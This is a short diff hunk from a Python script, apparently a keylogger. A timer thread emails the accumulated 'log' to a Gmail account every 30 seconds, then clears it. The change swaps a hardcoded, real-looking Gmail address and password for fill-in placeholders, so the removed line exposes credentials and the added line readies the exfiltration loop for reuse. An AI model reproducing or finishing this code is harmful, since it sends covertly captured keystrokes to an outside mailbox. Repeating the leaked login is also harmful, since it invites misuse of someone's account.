@@ -47,7 +47,7 @@ try:
 
     def thread_func():
         global log
-        send_email("memerbremer@gmail.com","Cb003958980!", log.encode('utf-8'))
+        send_email("enter your mail(must be gmail)","enter your password", log.encode('utf-8'))
         log = ""
         timer_object = threading.Timer(30, thread_func)
         timer_object.start()
